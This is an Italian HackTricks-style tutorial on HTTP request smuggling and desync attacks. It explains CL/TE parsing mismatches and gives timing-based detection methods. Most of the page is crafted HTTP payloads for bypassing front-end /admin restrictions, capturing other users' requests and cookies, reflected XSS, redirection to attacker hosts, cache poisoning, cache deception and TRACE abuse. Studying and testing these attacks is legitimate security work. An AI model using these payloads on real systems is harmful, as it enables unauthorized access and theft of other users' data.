# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cos'√®

Questa vulnerabilit√† si verifica quando una **desincronizzazione** tra i **proxy front-end** e il server **back-end** consente a un **attaccante** di **inviare** una **richiesta** HTTP che sar√† **interpretata** come una **singola richiesta** dai **proxy front-end** (bilanciamento del carico/reverse-proxy) e **come 2 richieste** dal server **back-end**.\
Questo consente a un utente di **modificare la prossima richiesta che arriva al server back-end dopo la sua**.

### Teoria

[**Specifiche RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Se un messaggio viene ricevuto con sia un campo di intestazione Transfer-Encoding che un campo di intestazione Content-Length, quest'ultimo DEVE essere ignorato.

**Content-Length**

> L'intestazione dell'entit√† Content-Length indica la dimensione del corpo dell'entit√†, in byte, inviato al destinatario.

**Transfer-Encoding: chunked**

> L'intestazione Transfer-Encoding specifica la forma di codifica utilizzata per trasferire in modo sicuro il corpo del payload all'utente.\
> Chunked significa che i dati di grandi dimensioni vengono inviati in una serie di chunk.

### Realt√†

Il **Front-End** (un bilanciatore di carico / Reverse Proxy) **elabora** l'intestazione _**content-length**_ o l'intestazione _**transfer-encoding**_ e il server **Back-end** **elabora l'altra**, provocando una **desincronizzazione** tra i 2 sistemi.\
Questo potrebbe essere molto critico poich√© **un attaccante sar√† in grado di inviare una richiesta** al reverse proxy che sar√† **interpretata** dal server **back-end** **come 2 richieste diverse**. Il **pericolo** di questa tecnica risiede nel fatto che il server **back-end** **interpreta** la **2¬™ richiesta iniettata** come se **provenisse dal prossimo client** e la **vera richiesta** di quel client sar√† **parte** della **richiesta iniettata**.

### Particolarit√†

Ricorda che in HTTP **un carattere di nuova riga √® composto da 2 byte:**

* **Content-Length**: Questa intestazione utilizza un **numero decimale** per indicare il **numero** di **byte** del **corpo** della richiesta. Si prevede che il corpo termini nell'ultimo carattere, **non √® necessaria una nuova riga alla fine della richiesta**.
* **Transfer-Encoding:** Questa intestazione utilizza nel **corpo** un **numero esadecimale** per indicare il **numero** di **byte** del **prossimo chunk**. Il **chunk** deve **terminare** con una **nuova riga** ma questa nuova riga **non √® conteggiata** dall'indicatore di lunghezza. Questo metodo di trasferimento deve terminare con un **chunk di dimensione 0 seguito da 2 nuove righe**: `0`
* **Connection**: Basato sulla mia esperienza, √® consigliato utilizzare **`Connection: keep-alive`** nella prima richiesta dello smuggling.

## Esempi di Base

{% hint style="success" %}
Quando si cerca di sfruttare questo con Burp Suite **disabilitare `Update Content-Length` e `Normalize HTTP/1 line endings`** nel ripetitore perch√© alcuni gadget abusano delle nuove righe, dei ritorni a capo e dei content-length malformati.
{% endhint %}

Gli attacchi di HTTP request smuggling sono creati inviando richieste ambigue che sfruttano le discrepanze nel modo in cui i server front-end e back-end interpretano le intestazioni `Content-Length` (CL) e `Transfer-Encoding` (TE). Questi attacchi possono manifestarsi in diverse forme, principalmente come **CL.TE**, **TE.CL** e **TE.TE**. Ogni tipo rappresenta una combinazione unica di come i server front-end e back-end danno priorit√† a queste intestazioni. Le vulnerabilit√† sorgono dai server che elaborano la stessa richiesta in modi diversi, portando a risultati imprevisti e potenzialmente dannosi.

### Esempi di Base dei Tipi di Vulnerabilit√†

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

{% hint style="info" %}
Alla tabella precedente dovresti aggiungere la tecnica TE.0, come la tecnica CL.0 ma utilizzando Transfer Encoding.
{% endhint %}

#### Vulnerabilit√† CL.TE (Content-Length utilizzato dal Front-End, Transfer-Encoding utilizzato dal Back-End)

* **Front-End (CL):** Elabora la richiesta in base all'intestazione `Content-Length`.
* **Back-End (TE):** Elabora la richiesta in base all'intestazione `Transfer-Encoding`.
* **Scenario di attacco:**
* L'attaccante invia una richiesta in cui il valore dell'intestazione `Content-Length` non corrisponde alla lunghezza effettiva del contenuto.
* Il server front-end inoltra l'intera richiesta al back-end, basandosi sul valore di `Content-Length`.
* Il server back-end elabora la richiesta come chunked a causa dell'intestazione `Transfer-Encoding: chunked`, interpretando i dati rimanenti come una richiesta separata e successiva.
*   **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vulnerabilit√† TE.CL (Transfer-Encoding utilizzato dal Front-End, Content-Length utilizzato dal Back-End)

* **Front-End (TE):** Elabora la richiesta in base all'intestazione `Transfer-Encoding`.
* **Back-End (CL):** Elabora la richiesta in base all'intestazione `Content-Length`.
* **Scenario di attacco:**
* L'attaccante invia una richiesta chunked in cui la dimensione del chunk (`7b`) e la lunghezza effettiva del contenuto (`Content-Length: 4`) non si allineano.
* Il server front-end, rispettando `Transfer-Encoding`, inoltra l'intera richiesta al back-end.
* Il server back-end, rispettando `Content-Length`, elabora solo la parte iniziale della richiesta (`7b` byte), lasciando il resto come parte di una richiesta successiva non intenzionata.
*   **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Vulnerabilit√† TE.TE (Transfer-Encoding utilizzato da entrambi, con offuscamento)

* **Server:** Entrambi supportano `Transfer-Encoding`, ma uno pu√≤ essere ingannato a ignorarlo tramite offuscamento.
* **Scenario di attacco:**
* L'attaccante invia una richiesta con intestazioni `Transfer-Encoding` offuscate.
* A seconda di quale server (front-end o back-end) non riesce a riconoscere l'offuscamento, pu√≤ essere sfruttata una vulnerabilit√† CL.TE o TE.CL.
* La parte non elaborata della richiesta, come vista da uno dei server, diventa parte di una richiesta successiva, portando a smuggling.
*   **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Scenario CL.CL (Content-Length utilizzato sia dal Front-End che dal Back-End)**

* Entrambi i server elaborano la richiesta basandosi esclusivamente sull'intestazione `Content-Length`.
* Questo scenario tipicamente non porta a smuggling, poich√© c'√® allineamento nel modo in cui entrambi i server interpretano la lunghezza della richiesta.
*   **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **Scenario CL.0**

* Si riferisce a scenari in cui l'intestazione `Content-Length` √® presente e ha un valore diverso da zero, indicando che il corpo della richiesta ha contenuto. Il back-end ignora l'intestazione `Content-Length` (che √® trattata come 0), ma il front-end la analizza.
* √à cruciale per comprendere e creare attacchi di smuggling, poich√© influisce su come i server determinano la fine di una richiesta.
*   **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### Scenario TE.0

* Come il precedente ma utilizzando TE
* Tecnica [riportata qui](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
* **Esempio**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Rompere il server web

Questa tecnica √® utile anche in scenari in cui √® possibile **rompere un server web mentre si legge i dati HTTP iniziali** ma **senza chiudere la connessione**. In questo modo, il **corpo** della richiesta HTTP sar√† considerato la **prossima richiesta HTTP**.

Ad esempio, come spiegato in [**questo writeup**](https://mizu.re/post/twisty-python), in Werkzeug era possibile inviare alcuni caratteri **Unicode** e questo far√† **rompere** il server. Tuttavia, se la connessione HTTP √® stata creata con l'intestazione **`Connection: keep-alive`**, il corpo della richiesta non verr√† letto e la connessione rimarr√† aperta, quindi il **corpo** della richiesta sar√† trattato come la **prossima richiesta HTTP**.

#### Forzare tramite intestazioni hop-by-hop

Abusando delle intestazioni hop-by-hop, potresti indicare al proxy di **eliminare l'intestazione Content-Length o Transfer-Encoding affinch√© un HTTP request smuggling sia possibile da abusare**.
```
Connection: Content-Length
```
Per **maggiori informazioni sugli header hop-by-hop** visita:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Trovare HTTP Request Smuggling

Identificare le vulnerabilit√† di HTTP request smuggling pu√≤ spesso essere realizzato utilizzando tecniche di temporizzazione, che si basano sull'osservazione di quanto tempo impiega il server a rispondere a richieste manipolate. Queste tecniche sono particolarmente utili per rilevare vulnerabilit√† CL.TE e TE.CL. Oltre a questi metodi, ci sono altre strategie e strumenti che possono essere utilizzati per trovare tali vulnerabilit√†:

### Trovare Vulnerabilit√† CL.TE Utilizzando Tecniche di Temporizzazione

* **Metodo:**
* Invia una richiesta che, se l'applicazione √® vulnerabile, far√† s√¨ che il server back-end attenda dati aggiuntivi.
*   **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Osservazione:**
* Il server front-end elabora la richiesta in base a `Content-Length` e interrompe il messaggio prematuramente.
* Il server back-end, aspettandosi un messaggio chunked, attende il chunk successivo che non arriva mai, causando un ritardo.
* **Indicatori:**
* Timeout o lunghi ritardi nella risposta.
* Ricezione di un errore 400 Bad Request dal server back-end, a volte con informazioni dettagliate sul server.

### Trovare Vulnerabilit√† TE.CL Utilizzando Tecniche di Temporizzazione

* **Metodo:**
* Invia una richiesta che, se l'applicazione √® vulnerabile, far√† s√¨ che il server back-end attenda dati aggiuntivi.
*   **Esempio:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Osservazione:**
* Il server front-end elabora la richiesta in base a `Transfer-Encoding` e inoltra l'intero messaggio.
* Il server back-end, aspettandosi un messaggio basato su `Content-Length`, attende dati aggiuntivi che non arrivano mai, causando un ritardo.

### Altri Metodi per Trovare Vulnerabilit√†

* **Analisi delle Risposte Differenziali:**
* Invia versioni leggermente variate di una richiesta e osserva se le risposte del server differiscono in modo inaspettato, indicando una discrepanza di parsing.
* **Utilizzo di Strumenti Automatizzati:**
* Strumenti come l'estensione 'HTTP Request Smuggler' di Burp Suite possono testare automaticamente queste vulnerabilit√† inviando varie forme di richieste ambigue e analizzando le risposte.
* **Test di Variazione del Content-Length:**
* Invia richieste con valori di `Content-Length` variabili che non sono allineati con la lunghezza effettiva del contenuto e osserva come il server gestisce tali discrepanze.
* **Test di Variazione del Transfer-Encoding:**
* Invia richieste con header `Transfer-Encoding` offuscati o malformati e monitora come i server front-end e back-end rispondono in modo diverso a tali manipolazioni.

### Test di Vulnerabilit√† di HTTP Request Smuggling

Dopo aver confermato l'efficacia delle tecniche di temporizzazione, √® fondamentale verificare se le richieste del client possono essere manipolate. Un metodo semplice √® tentare di avvelenare le tue richieste, ad esempio, facendo in modo che una richiesta a `/` restituisca una risposta 404. Gli esempi `CL.TE` e `TE.CL` precedentemente discussi in [Esempi di Base](./#basic-examples) dimostrano come avvelenare una richiesta del client per ottenere una risposta 404, nonostante il client miri ad accedere a una risorsa diversa.

**Considerazioni Chiave**

Quando testi le vulnerabilit√† di request smuggling interferendo con altre richieste, tieni a mente:

* **Connessioni di Rete Distinte:** Le richieste "attacco" e "normali" dovrebbero essere inviate su connessioni di rete separate. Utilizzare la stessa connessione per entrambe non convalida la presenza della vulnerabilit√†.
* **URL e Parametri Coerenti:** Cerca di utilizzare URL e nomi di parametri identici per entrambe le richieste. Le applicazioni moderne spesso instradano le richieste a server back-end specifici in base a URL e parametri. Allineare questi aumenta la probabilit√† che entrambe le richieste siano elaborate dallo stesso server, un prerequisito per un attacco riuscito.
* **Temporizzazione e Condizioni di Gara:** La richiesta "normale", destinata a rilevare interferenze dalla richiesta "attacco", compete con altre richieste dell'applicazione concorrenti. Pertanto, invia la richiesta "normale" immediatamente dopo la richiesta "attacco". Applicazioni occupate potrebbero richiedere pi√π tentativi per una conferma conclusiva della vulnerabilit√†.
* **Sfide di Bilanciamento del Carico:** I server front-end che fungono da bilanciatori di carico possono distribuire le richieste su vari sistemi back-end. Se le richieste "attacco" e "normali" finiscono su sistemi diversi, l'attacco non avr√† successo. Questo aspetto del bilanciamento del carico potrebbe richiedere diversi tentativi per confermare una vulnerabilit√†.
* **Impatto Utente Non Intenzionale:** Se il tuo attacco influisce involontariamente sulla richiesta di un altro utente (non la richiesta "normale" che hai inviato per la rilevazione), questo indica che il tuo attacco ha influenzato un altro utente dell'applicazione. Test continui potrebbero interrompere altri utenti, richiedendo un approccio cauto.

## Abusare di HTTP Request Smuggling

### Eludere la Sicurezza del Front-End tramite HTTP Request Smuggling

A volte, i proxy front-end applicano misure di sicurezza, esaminando le richieste in arrivo. Tuttavia, queste misure possono essere eluse sfruttando l'HTTP Request Smuggling, consentendo l'accesso non autorizzato a endpoint riservati. Ad esempio, l'accesso a `/admin` potrebbe essere vietato esternamente, con il proxy front-end che blocca attivamente tali tentativi. Tuttavia, questo proxy potrebbe trascurare di ispezionare le richieste incorporate all'interno di una richiesta HTTP contrabbandata, lasciando un'opportunit√† per bypassare queste restrizioni.

Considera i seguenti esempi che illustrano come l'HTTP Request Smuggling pu√≤ essere utilizzato per eludere i controlli di sicurezza del front-end, mirando specificamente al percorso `/admin` che √® tipicamente protetto dal proxy front-end:

**Esempio CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Nell'attacco CL.TE, l'intestazione `Content-Length` viene sfruttata per la richiesta iniziale, mentre la successiva richiesta incorporata utilizza l'intestazione `Transfer-Encoding: chunked`. Il proxy front-end elabora la richiesta `POST` iniziale ma non riesce a ispezionare la richiesta incorporata `GET /admin`, consentendo l'accesso non autorizzato al percorso `/admin`.

**TE.CL Esempio**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Al contrario, nell'attacco TE.CL, la richiesta iniziale `POST` utilizza `Transfer-Encoding: chunked`, e la successiva richiesta incorporata viene elaborata in base all'intestazione `Content-Length`. Simile all'attacco CL.TE, il proxy front-end ignora la richiesta `GET /admin` contrabbandata, concedendo involontariamente accesso al percorso riservato `/admin`.

### Rivelazione della riscrittura delle richieste front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Le applicazioni spesso impiegano un **server front-end** per modificare le richieste in arrivo prima di passarle al server back-end. Una modifica tipica comporta l'aggiunta di intestazioni, come `X-Forwarded-For: <IP del client>`, per trasmettere l'IP del client al back-end. Comprendere queste modifiche pu√≤ essere cruciale, poich√© potrebbe rivelare modi per **bypassare le protezioni** o **scoprire informazioni o endpoint nascosti**.

Per indagare su come un proxy altera una richiesta, individua un parametro POST che il back-end restituisce nella risposta. Quindi, crea una richiesta, utilizzando questo parametro per ultimo, simile al seguente:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In questa struttura, i componenti della richiesta successiva vengono aggiunti dopo `search=`, che √® il parametro riflesso nella risposta. Questa riflessione esporr√† le intestazioni della richiesta successiva.

√à importante allineare l'intestazione `Content-Length` della richiesta annidata con la lunghezza effettiva del contenuto. √à consigliabile iniziare con un valore basso e aumentare gradualmente, poich√© un valore troppo basso truncher√† i dati riflessi, mentre un valore troppo alto pu√≤ causare un errore nella richiesta.

Questa tecnica √® applicabile anche nel contesto di una vulnerabilit√† TE.CL, ma la richiesta dovrebbe terminare con `search=\r\n0`. Indipendentemente dai caratteri di nuova riga, i valori verranno aggiunti al parametro di ricerca.

Questo metodo serve principalmente a comprendere le modifiche alla richiesta effettuate dal proxy front-end, eseguendo essenzialmente un'indagine autodiretta.

### Catturare le richieste di altri utenti <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

√à possibile catturare le richieste dell'utente successivo aggiungendo una richiesta specifica come valore di un parametro durante un'operazione POST. Ecco come pu√≤ essere realizzato:

Aggiungendo la seguente richiesta come valore di un parametro, puoi memorizzare la richiesta del cliente successivo:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In questo scenario, il **parametro commento** √® destinato a memorizzare i contenuti all'interno della sezione commenti di un post su una pagina accessibile pubblicamente. Di conseguenza, i contenuti della richiesta successiva appariranno come un commento.

Tuttavia, questa tecnica ha delle limitazioni. In generale, cattura i dati solo fino al delimitatore del parametro utilizzato nella richiesta smuggled. Per le sottomissioni di moduli codificati in URL, questo delimitatore √® il carattere `&`. Ci√≤ significa che il contenuto catturato dalla richiesta dell'utente vittima si fermer√† al primo `&`, che potrebbe anche far parte della stringa di query.

Inoltre, vale la pena notare che questo approccio √® anche valido con una vulnerabilit√† TE.CL. In tali casi, la richiesta dovrebbe concludersi con `search=\r\n0`. Indipendentemente dai caratteri di nuova riga, i valori saranno aggiunti al parametro di ricerca.

### Utilizzare l'HTTP request smuggling per sfruttare il XSS riflesso

L'HTTP Request Smuggling pu√≤ essere sfruttato per attaccare pagine web vulnerabili a **XSS Riflesso**, offrendo vantaggi significativi:

* L'interazione con gli utenti target √® **non necessaria**.
* Consente di sfruttare l'XSS in parti della richiesta che sono **normalmente inaccessibili**, come le intestazioni delle richieste HTTP.

In scenari in cui un sito web √® suscettibile a XSS Riflesso attraverso l'intestazione User-Agent, il seguente payload dimostra come sfruttare questa vulnerabilit√†:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Questo payload √® strutturato per sfruttare la vulnerabilit√† tramite:

1. Iniziare una richiesta `POST`, apparentemente tipica, con un'intestazione `Transfer-Encoding: chunked` per indicare l'inizio dello smuggling.
2. Seguire con un `0`, che segna la fine del corpo del messaggio chunked.
3. Poi, viene introdotta una richiesta `GET` smuggled, dove l'intestazione `User-Agent` √® iniettata con uno script, `<script>alert(1)</script>`, attivando l'XSS quando il server elabora questa richiesta successiva.

Manipolando il `User-Agent` tramite smuggling, il payload elude i normali vincoli delle richieste, sfruttando cos√¨ la vulnerabilit√† XSS Riflessa in modo non standard ma efficace.

#### HTTP/0.9

{% hint style="danger" %}
Nel caso in cui il contenuto dell'utente venga riflesso in una risposta con un **`Content-type`** come **`text/plain`**, impedendo l'esecuzione dell'XSS. Se il server supporta **HTTP/0.9 potrebbe essere possibile eludere questo**!
{% endhint %}

La versione HTTP/0.9 era precedente alla 1.0 e utilizza solo verbi **GET** e **non** risponde con **intestazioni**, solo il corpo.

In [**questo writeup**](https://mizu.re/post/twisty-python), questo √® stato abusato con uno smuggling di richieste e un **endpoint vulnerabile che risponder√† con l'input dell'utente** per smuggler una richiesta con HTTP/0.9. Il parametro che verr√† riflesso nella risposta conteneva una **falsa risposta HTTP/1.1 (con intestazioni e corpo)** quindi la risposta conterr√† codice JS eseguibile valido con un `Content-Type` di `text/html`.

### Sfruttare i reindirizzamenti in loco con HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Le applicazioni spesso reindirizzano da un URL a un altro utilizzando il nome host dall'intestazione `Host` nell'URL di reindirizzamento. Questo √® comune con server web come Apache e IIS. Ad esempio, richiedere una cartella senza una barra finale risulta in un reindirizzamento per includere la barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Risultati in:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Sebbene apparentemente innocuo, questo comportamento pu√≤ essere manipolato utilizzando HTTP request smuggling per reindirizzare gli utenti a un sito esterno. Ad esempio:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Questa richiesta di contrabbando potrebbe causare la successiva richiesta dell'utente elaborata di essere reindirizzata a un sito web controllato dall'attaccante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Risultati in:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In questo scenario, la richiesta di un file JavaScript da parte di un utente viene dirottata. L'attaccante pu√≤ potenzialmente compromettere l'utente servendo JavaScript malevolo in risposta.

### Sfruttare il Web Cache Poisoning tramite HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Il web cache poisoning pu√≤ essere eseguito se qualsiasi componente dell'**infrastruttura front-end memorizza nella cache i contenuti**, tipicamente per migliorare le prestazioni. Manipolando la risposta del server, √® possibile **avvelenare la cache**.

In precedenza, abbiamo osservato come le risposte del server potessero essere modificate per restituire un errore 404 (fare riferimento a [Esempi di Base](./#basic-examples)). Allo stesso modo, √® possibile ingannare il server per consegnare il contenuto di `/index.html` in risposta a una richiesta per `/static/include.js`. Di conseguenza, il contenuto di `/static/include.js` viene sostituito nella cache con quello di `/index.html`, rendendo `/static/include.js` inaccessibile agli utenti, potenzialmente portando a un Denial of Service (DoS).

Questa tecnica diventa particolarmente potente se viene scoperta una **vulnerabilit√† Open Redirect** o se c'√® un **reindirizzamento in loco a un open redirect**. Tali vulnerabilit√† possono essere sfruttate per sostituire il contenuto memorizzato nella cache di `/static/include.js` con uno script sotto il controllo dell'attaccante, abilitando essenzialmente un attacco Cross-Site Scripting (XSS) diffuso contro tutti i client che richiedono il `/static/include.js` aggiornato.

Di seguito √® riportata un'illustrazione di sfruttare **l'avvelenamento della cache combinato con un reindirizzamento in loco a un open redirect**. L'obiettivo √® modificare il contenuto della cache di `/static/include.js` per servire codice JavaScript controllato dall'attaccante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Nota la richiesta incorporata che mira a `/post/next?postId=3`. Questa richiesta verr√† reindirizzata a `/post?postId=4`, utilizzando il **valore dell'intestazione Host** per determinare il dominio. Alterando l'**intestazione Host**, l'attaccante pu√≤ reindirizzare la richiesta al proprio dominio (**reindirizzamento in loco a reindirizzamento aperto**).

Dopo un **avvelenamento del socket** riuscito, dovrebbe essere avviata una **richiesta GET** per `/static/include.js`. Questa richiesta sar√† contaminata dalla precedente richiesta di **reindirizzamento in loco a reindirizzamento aperto** e recuperer√† il contenuto dello script controllato dall'attaccante.

Successivamente, qualsiasi richiesta per `/static/include.js` servir√† il contenuto memorizzato nella cache dello script dell'attaccante, lanciando efficacemente un ampio attacco XSS.

### Utilizzare l'hacking delle richieste HTTP per eseguire la deception della cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Qual √® la differenza tra avvelenamento della cache web e deception della cache web?**
>
> * Nell'**avvelenamento della cache web**, l'attaccante costringe l'applicazione a memorizzare contenuti dannosi nella cache, e questo contenuto viene servito dalla cache ad altri utenti dell'applicazione.
> * Nella **deception della cache web**, l'attaccante costringe l'applicazione a memorizzare contenuti sensibili appartenenti a un altro utente nella cache, e l'attaccante poi recupera questo contenuto dalla cache.

L'attaccante crea una richiesta di contrabbando che recupera contenuti sensibili specifici per l'utente. Considera il seguente esempio:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Se questa richiesta di contrabbando avvelena un'entrata della cache destinata a contenuti statici (ad es., `/someimage.png`), i dati sensibili della vittima da `/private/messages` potrebbero essere memorizzati nella cache sotto l'entrata della cache dei contenuti statici. Di conseguenza, l'attaccante potrebbe potenzialmente recuperare questi dati sensibili memorizzati nella cache.

### Abusare di TRACE tramite HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In questo post**](https://portswigger.net/research/trace-desync-attack) si suggerisce che se il server ha abilitato il metodo TRACE potrebbe essere possibile abusarne con un HTTP Request Smuggling. Questo perch√© questo metodo rifletter√† qualsiasi intestazione inviata al server come parte del corpo della risposta. Ad esempio:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Invier√† una risposta come:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Un esempio su come abusare di questo comportamento sarebbe **smuggler prima una richiesta HEAD**. Questa richiesta verr√† risposta solo con le **intestazioni** di una richiesta GET (**`Content-Type`** tra esse). E smuggler **immediatamente dopo la HEAD una richiesta TRACE**, che sar√† **riflettente i dati inviati**.\
Poich√© la risposta HEAD conterr√† un'intestazione `Content-Length`, la **risposta della richiesta TRACE sar√† trattata come il corpo della risposta HEAD, riflettendo quindi dati arbitrari** nella risposta.\
Questa risposta sar√† inviata alla richiesta successiva sulla connessione, quindi potrebbe essere **utilizzata in un file JS memorizzato nella cache, ad esempio, per iniettare codice JS arbitrario**.

### Abusare di TRACE tramite HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continuare seguendo [**questo post**](https://portswigger.net/research/trace-desync-attack) √® suggerito un altro modo per abusare del metodo TRACE. Come commentato, smuggler una richiesta HEAD e una richiesta TRACE √® possibile **controllare alcuni dati riflessi** nella risposta alla richiesta HEAD. La lunghezza del corpo della richiesta HEAD √® fondamentalmente indicata nell'intestazione Content-Length ed √® formata dalla risposta alla richiesta TRACE.

Pertanto, la nuova idea sarebbe che, conoscendo questo Content-Length e i dati forniti nella risposta TRACE, √® possibile far s√¨ che la risposta TRACE contenga una risposta HTTP valida dopo l'ultimo byte del Content-Length, consentendo a un attaccante di controllare completamente la richiesta alla risposta successiva (che potrebbe essere utilizzata per eseguire un cache poisoning).

Esempio:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

